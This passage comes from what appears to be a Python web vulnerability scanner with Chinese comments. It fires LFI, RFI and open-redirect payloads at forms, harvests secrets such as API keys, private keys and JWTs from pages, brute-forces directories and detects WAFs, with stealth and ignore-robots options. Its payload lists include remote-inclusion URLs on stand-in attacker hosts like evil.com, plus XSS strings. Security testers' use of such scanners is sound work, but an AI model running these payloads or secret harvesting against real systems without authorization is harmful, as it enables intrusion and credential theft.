                content = await response.text()
                if any(re.search(indicator, content, re.I) for indicator in lfi_indicators):
                    return {
                        'url': str(response.url),
                        'payload': payload,
                        'form_details': form_details if self.verbose else None,
                        'response_snippet': content[:200] if self.verbose else None,
                        'status_code': response.status
                    }
            return None

        tasks = []
        for form in forms:
            form_details = self.get_form_details(form)
            for payload in lfi_payloads:
                tasks.append(test_lfi_payload(form_details, payload))
        
        results = await asyncio.gather(*tasks)
        for vuln in [r for r in results if r]:
            self.results['lfi_vulnerabilities'].append(vuln)
            logging.info(f"[+] 在 {vuln['url']} 检测到LFI漏洞")
            logging.info(f"[*] 使用payload: {vuln['payload']}")
            if self.verbose:
                logging.info(f"[*] 状态码: {vuln['status_code']}")
                logging.info("[*] 表单详情:")
                pprint(vuln['form_details'])
                logging.info(f"[*] 响应片段: {vuln['response_snippet']}")

        self.results['performance']['lfi_scan'] = time.time() - start_time
        return bool(self.results['lfi_vulnerabilities'])

    async def scan_rfi(self) -> bool:
        """扫描远程文件包含（RFI）漏洞"""
        start_time = time.time()
        logging.info("-" * 20 + "[*] RFI检测加载中..." + "-" * 20)
        forms, _ = await self.get_all_forms()
        logging.info(f"[+] 在 {self.url} 上检测到 {len(forms)} 个表单")
        
        rfi_payloads = [
            "http://evil.com/malicious.php",
            "https://pastebin.com/raw/abc123",
            "ftp://anonymous@evil.com/script.txt",
            "http://127.0.0.1:80/test.php",
            "php://input"
        ]
        rfi_indicators = [
            r"evil\.com",
            r"pastebin",
            r"ftp",
            r"eval\(",
            r"system\(",
            r"malicious content"
        ]
        
        async def test_rfi_payload(form_details: Dict, payload: str) -> Optional[Dict]:
            response = await self._async_submit_form(form_details, payload)
            if response:
                content = await response.text()
                if any(re.search(indicator, content, re.I) for indicator in rfi_indicators):
                    return {
                        'url': str(response.url),
                        'payload': payload,
                        'form_details': form_details if self.verbose else None,
                        'response_snippet': content[:200] if self.verbose else None,
                        'status_code': response.status
                    }
            return None

        tasks = []
        for form in forms:
            form_details = self.get_form_details(form)
            for payload in rfi_payloads:
                tasks.append(test_rfi_payload(form_details, payload))
        
        results = await asyncio.gather(*tasks)
        for vuln in [r for r in results if r]:
            self.results['rfi_vulnerabilities'].append(vuln)
            logging.info(f"[+] 在 {vuln['url']} 检测到RFI漏洞")
            logging.info(f"[*] 使用payload: {vuln['payload']}")
            if self.verbose:
                logging.info(f"[*] 状态码: {vuln['status_code']}")
                logging.info("[*] 表单详情:")
                pprint(vuln['form_details'])
                logging.info(f"[*] 响应片段: {vuln['response_snippet']}")

        self.results['performance']['rfi_scan'] = time.time() - start_time
        return bool(self.results['rfi_vulnerabilities'])

    async def scan_open_redirect(self) -> bool:
        """扫描开放重定向漏洞"""
        start_time = time.time()
        logging.info("-" * 20 + "[*] 开放重定向检测加载中..." + "-" * 20)
        forms, _ = await self.get_all_forms()
        logging.info(f"[+] 在 {self.url} 上检测到 {len(forms)} 个表单")
        
        redirect_payloads = [
            "http://evil.com",
            "//evil.com",
            "https://google.com",
            "/\\evil.com",
            "javascript:alert('xss')",  # 检查URL未正确过滤
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        async def test_redirect_payload(form_details: Dict, payload: str) -> Optional[Dict]:
            response = await self._async_submit_form(form_details, payload)
            if response:
                final_url = str(response.url)
                headers = dict(response.headers)
                if payload in final_url or \
                   any(payload in headers.get(h, '').lower() for h in ['Location', 'Refresh']) or \
                   response.status in [301, 302, 303, 307, 308]:
                    content = await response.text()
                    return {
                        'url': str(response.url),
                        'payload': payload,
                        'form_details': form_details if self.verbose else None,
                        'final_url': final_url,
                        'status_code': response.status,
                        'headers': headers if self.verbose else None,
                        'response_snippet': content[:200] if self.verbose else None
                    }
            return None

        tasks = []
        for form in forms:
            form_details = self.get_form_details(form)
            for payload in redirect_payloads:
                tasks.append(test_redirect_payload(form_details, payload))
        
        results = await asyncio.gather(*tasks)
        for vuln in [r for r in results if r]:
            self.results['open_redirects'].append(vuln)
            logging.info(f"[+] 在 {vuln['url']} 检测到开放重定向漏洞")
            logging.info(f"[*] 使用payload: {vuln['payload']}")
            logging.info(f"[*] 重定向到: {vuln['final_url']}")
            if self.verbose:
                logging.info(f"[*] 状态码: {vuln['status_code']}")
                logging.info("[*] 表单详情:")
                pprint(vuln['form_details'])
                logging.info(f"[*] 响应头: {vuln['headers']}")
                if vuln['response_snippet']:
                    logging.info(f"[*] 响应片段: {vuln['response_snippet']}")

        self.results['performance']['redirect_scan'] = time.time() - start_time
        return bool(self.results['open_redirects'])

    async def _scan_sensitive_info(self, content: str) -> None:
        """扫描页面中的敏感信息"""
        patterns = {
            'email': r'[\w\.-]+@[\w\.-]+\.\w+',
            'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
            'credit_card': r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
            'api_key': r'(?i)(api[-_]?key|token)\s*[:=]\s*[A-Za-z0-9]{20,}',
            'password': r'(?i)pass(word)?\s*[:=]\s*["\']?[^"\']{8,}["\']?',
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'private_key': r'-----BEGIN [A-Z ]+PRIVATE KEY-----[\s\S]+?-----END [A-Z ]+PRIVATE KEY-----',
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'jwt': r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
            'oauth_token': r'(?i)oauth[-_]?token\s*[:=]\s*[A-Za-z0-9]{20,}',
            'db_connection': r'(?i)(mysql|postgres|sqlserver|mongodb)://[A-Za-z0-9:_@]+'
        }
        
        for info_type, pattern in patterns.items():
            matches = re.findall(pattern, content)
            if matches:
                decoded = []
                if info_type == 'jwt':
                    for token in matches[:3]:  # 限制JWT解码数量
                        try:
                            header = jwt.get_unverified_header(token)
                            payload = jwt.decode(token, options={"verify_signature": False})
                            decoded.append({'token': token, 'header': header, 'payload': payload})
                        except:
                            pass
                
                self.results['sensitive_info'].append({
                    'type': info_type,
                    'matches': matches[:10],
                    'total': len(matches),
                    'context': [content[max(0, content.index(m) - 20):content.index(m) + len(m) + 20] for m in matches[:3]] if self.verbose else None,
                    'decoded': decoded if info_type == 'jwt' and decoded else None
                })
                logging.info(f"[+] 检测到敏感信息 ({info_type}): {', '.join(matches[:5])}" + 
                           (f" 等共{len(matches)}项" if len(matches) > 5 else ""))
                if self.verbose and info_type in ['api_key', 'password', 'private_key', 'aws_key', 'jwt', 'oauth_token', 'db_connection']:
                    logging.warning(f"[!] 发现高危敏感信息: {info_type}")
                    if info_type == 'jwt' and decoded:
                        for d in decoded:
                            logging.info(f"[*] JWT解码 - Header: {d['header']}, Payload: {d['payload']}")

    async def scan_directories(self, wordlist: str = "dir.txt") -> None:
        """异步扫描网站目录并检测WAF"""
        start_time = time.time()
        logging.info("-" * 20 + "[*] 网站目录加载中..." + "-" * 20)
        logging.info("开始扫描存在的目录")
        
        try:
            with open(wordlist, "r", encoding='utf-8') as file:
                urls_to_scan = [urljoin(self.url, line.strip()) for line in file if line.strip()]
            if self.custom_wordlist:
                with open(self.custom_wordlist, "r", encoding='utf-8') as custom_file:
                    urls_to_scan.extend([urljoin(self.url, line.strip()) for line in custom_file if line.strip()])
        except FileNotFoundError as e:
            logging.error(f"[-] 未找到字典文件: {e}")
            return

        waf_detected = False
        async def scan_dir(url: str) -> Tuple[str, int, int, Dict]:
            if url in self.checked_urls or (self.respect_robots and not await self._is_allowed_by_robots(url)):
                return url, 0, 0, {}
            async with self.semaphore:
                try:
                    async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                        self.checked_urls.add(url)
                        content = await response.read()
                        return url, response.status, len(content), dict(response.headers)
                except:
                    return url, 0, 0, {}

        tasks = [scan_dir(url) for url in urls_to_scan]
        with tqdm(total=len(urls_to_scan), desc="扫描进度", disable=not self.verbose) as pbar:
            for future in asyncio.as_completed(tasks):
                url, status, content_length, headers = await future
                if status in [200, 201, 301, 302, 403, 401, 400]:
                    waf_indicators = ['cloudflare', 'akamai', 'sucuri', 'f5', 'mod_security', 'waf', 'firewall', 'incapsula', 'barracuda']
                    if any(ind in headers.get('Server', '').lower() or ind in str(headers).lower() for ind in waf_indicators) or \
                       headers.get('X-WAF', '').lower() == 'true':
                        waf_detected = True
                    dir_info = {
                        'url': url,
                        'status_code': status,
                        'status_text': responses.get(status, 'Unknown'),
                        'content_length': content_length,
                        'headers': headers if self.verbose else None,
                        'title': (await self._get_page_title(url)) if status in [200, 201] else None,
                        'content_type': headers.get('Content-Type', 'unknown'),
                        'server': headers.get('Server', 'unknown'),
                        'last_modified': headers.get('Last-Modified', None)
                    }
                    self.results['directories'].append(dir_info)
                    logging.info(f"[+] 发现目录: {url} ({status} {dir_info['status_text']})" + 
                               (f" - {dir_info['title']}" if dir_info['title'] else "") + 
                               (f" [{dir_info['content_type']}]" if self.verbose else ""))
                    if self.verbose and status == 403:
                        logging.info(f"[*] 可能隐藏敏感资源: {url}")
                pbar.update(1)

        end_time = time.time()
        logging.info(f"\n扫描完成，用时: {end_time - start_time:.2f} 秒")
        logging.info(f"发现 {len(self.results['directories'])} 个有效目录")
        if waf_detected:
            logging.warning("[!] 可能检测到WAF防护")
            self.results['url_info']['waf_detected'] = True
        self.results['performance']['dir_scan'] = end_time - start_time
        await self._save_results()

    async def _get_page_title(self, url: str) -> Optional[str]:
        """获取页面标题"""
        try:
            async with self.semaphore:
                async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    if response.status in [200, 201]:
                        soup = bs(await response.text(), "html.parser")
                        title = soup.find('title')
                        return title.text.strip() if title else None
        except:
            return None

    async def run(self) -> None:
        """运行所有扫描任务"""
        try:
            if await self.parse_url():
                await asyncio.gather(
                    self.scan_xss(),
                    self.scan_sql_injection(),
                    self.scan_ssrf(),
                    self.scan_lfi(),
                    self.scan_rfi(),
                    self.scan_open_redirect(),
                    self.scan_directories()
                )
        except Exception as e:
            logging.error(f"扫描过程中发生错误: {e}")
            logging.debug(traceback.format_exc())
        finally:
            await self.session.close()

def main():
    usage = '''python3 webscanner.py [-u url] [-t threads] [-w wordlist] [-o output] [-v] [-p proxy] [-r rate] [-s] [--no-robots] [--retries retries] [--custom-wordlist file]
by huocai | github https://www.github.com/huocai250'''
    parser = OptionParser(usage)
    parser.add_option('-u', dest='url', type='string', help='目标URL')
    parser.add_option('-t', dest='threads', type='int', default=10, help='线程数 (默认: 10)')
    parser.add_option('-w', dest='wordlist', type='string', default='dir.txt', help='目录字典文件 (默认: dir.txt)')
    parser.add_option('-o', dest='output', type='string', help='输出文件 (JSON格式)')
    parser.add_option('-v', action='store_true', dest='verbose', default=False, help='详细输出')
    parser.add_option('-p', dest='proxy', type='string', help='代理 (格式: http://host:port 或 socks5://host:port)')
    parser.add_option('-r', dest='rate', type='int', default=100, help='每秒请求限制 (默认: 100)')
    parser.add_option('-s', action='store_true', dest='stealth', default=False, help='隐秘模式')
    parser.add_option('--no-robots', action='store_false', dest='respect_robots', default=True, help='忽略robots.txt')
    parser.add_option('--retries', dest='retries', type='int', default=3, help='请求重试次数 (默认: 3)')
    parser.add_option('--custom-wordlist', dest='custom_wordlist', type='string', help='自定义子域名/目录字典文件')

    (options, args) = parser.parse_args()
    
    if not options.url:
        parser.print_help()
        sys.exit(1)

    scanner = WebScanner(
        options.url,
        threads=options.threads,
        output_file=options.output,
        verbose=options.verbose,
        proxy=options.proxy,
        rate_limit=options.rate,
        stealth_mode=options.stealth,
        respect_robots=options.respect_robots,
        retries=options.retries,
        custom_wordlist=options.custom_wordlist
    )
    
    asyncio.run(scanner.run())

if __name__ == "__main__":
    main()